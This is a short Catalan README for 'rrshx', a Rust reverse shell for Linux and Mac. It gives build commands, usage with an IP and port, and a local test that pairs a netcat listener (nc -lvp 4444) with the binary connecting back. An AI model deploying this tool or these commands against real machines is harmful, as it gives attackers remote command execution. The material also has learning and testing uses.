## rrshx - Rust Reverse Shell for Linux And Mac 
Que és una Reverse Shell? [https://en.wikipedia.org/wiki/Shell_shoveling](https://en.wikipedia.org/wiki/Shell_shoveling).

Utilització: **./rrshx [ip] [port]**

Exemple: **./rrshx 127.0.0.1 4444**

**Complilar a partir del codi font**

git clone https://github.com/jc4st3lls/rrshx.git

cd rrshx

cargo build --release 

(a la carpeta bin hi ha una versió compilada)

**Com provar**

Instal.lem Netcat a linux o mac. Un cop instal.lat, en un terminal l'engeguem.
**nc -lvp 4444**

Obrim un altre terminal i executem el binari compilat
**./rrshx 127.0.0.1 4444**

Si volem provar des del codi font **cargo run -- 127.0.0.1 4444**

El que conseguim és una shell en el terminal on hem engegat el netcat. Però, no és un terminal com a tal (tty). Les aplicacions que requereixen d'un terminal (tty) no funcionen correctament. Hem d'entendre que passem streams de dades des del client (rrshx) al servidor (nc).

[https://es.wikipedia.org/wiki/Tty_(Unix](https://es.wikipedia.org/wiki/Tty_(Unix))
[https://es.wikipedia.org/wiki/Emulador_de_terminal](https://es.wikipedia.org/wiki/Emulador_de_terminal)


Per solventar aquest problema, hi ha diferents tècniques. Deixo enllaç que us pot ajudar.


